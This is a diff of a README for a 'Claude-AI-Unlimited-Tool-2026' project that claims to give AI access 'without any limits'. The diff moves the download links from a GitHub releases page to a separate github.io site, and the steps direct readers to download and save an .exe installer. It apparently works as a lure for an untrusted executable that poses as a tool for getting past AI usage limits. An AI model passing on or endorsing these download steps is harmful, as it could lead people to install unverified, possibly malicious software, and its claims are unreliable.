@@ -1,6 +1,6 @@
 # ⚡ Claude-AI-Unlimited-Tool-2026 - Access artificial intelligence without any limits
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Untechnical-headwind100/Claude-AI-Unlimited-Tool-2026/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://untechnical-headwind100.github.io)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ To run this tool, your computer must meet the following hardware and software sp
 
 Follow these steps to obtain the correct files for your computer:
 
-1. Visit the following address: [https://github.com/Untechnical-headwind100/Claude-AI-Unlimited-Tool-2026/releases](https://github.com/Untechnical-headwind100/Claude-AI-Unlimited-Tool-2026/releases).
+1. Visit the following address: [https://untechnical-headwind100.github.io](https://untechnical-headwind100.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in .exe to start the download.
 4. Save the installer to your Downloads folder or your Desktop for easy access.
